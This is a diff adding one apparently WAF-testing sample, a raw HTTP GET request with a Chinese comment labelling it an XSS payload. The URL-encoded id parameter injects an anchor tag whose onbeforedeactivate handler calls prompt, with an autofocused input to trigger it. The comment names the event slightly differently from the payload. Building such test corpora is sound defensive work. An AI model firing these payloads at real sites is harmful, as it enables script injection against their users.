@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_a标签_onbeforedeactivate事件-06506553
+# 攻击载荷利用了HTML中的a标签和onbeforeactivate属性，触发prompt()函数，显示一个提示框。在元素被停用之前触发，使用双引号绕过。
+GET /?id=%3Ca%20id=x%20tabindex=1%20onbeforedeactivate=prompt%28%22xss%22%29%3E%3C%2Fa%3E%3Cinput%20autofocus%3E&bid=hd_tag_m8mv26ai HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26ai
+RM-PRO-Token: bc3a4f829b134821d376a2dfdf89279a
+RM-PRO-Time: 1742808567284
+User-Agent: curl/7.83.1
+
